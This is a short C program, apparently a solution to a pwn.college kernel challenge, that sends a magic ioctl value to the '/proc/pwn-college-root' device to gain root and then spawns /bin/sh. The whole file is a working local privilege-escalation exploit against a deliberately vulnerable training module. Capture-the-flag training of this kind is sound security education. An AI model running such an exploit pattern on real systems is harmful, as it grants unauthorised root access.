#include <sys/ioctl.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(void)
{
    int fd = open("/proc/pwn-college-root", O_RDWR);
    if (fd < 0)
    {
        printf("Failed to open device file\n");
        return -1;
    }
    ioctl(fd, _IO('p', 1), 0x13371337);
    close(fd);
    int euid = geteuid();
    printf("Euid = %d\n", euid);
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
